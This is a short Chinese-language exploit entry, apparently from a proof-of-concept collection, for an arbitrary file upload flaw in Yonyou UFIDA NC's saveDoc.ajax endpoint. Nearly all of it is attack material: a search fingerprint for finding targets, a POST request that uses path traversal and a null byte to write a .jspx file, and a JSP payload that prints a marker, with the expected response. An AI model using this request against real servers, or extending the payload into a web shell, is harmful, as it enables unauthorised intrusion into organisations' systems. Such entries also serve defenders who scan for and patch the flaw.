# 用友-UFIDA-NCsaveDoc.ajax存在任意文件上传漏洞

用友 ｜ 文件上传 ｜ —
- **指纹**：`title="产品登录界面"`
- **请求**：`POST /uapws/saveDoc.ajax?ws=/../../dudesite.jspx%00 HTTP/1.1`

**Payload**
```
content=<hi xmlns:hi="http://java.sun.com/JSP/Page">
<hi:directive.page import="java.util.*,java.io.*,java.net.*"/>
<hi:scriptlet>
out.println("dudesite");
</hi:scriptlet>
</hi>
```
- **响应特征**：200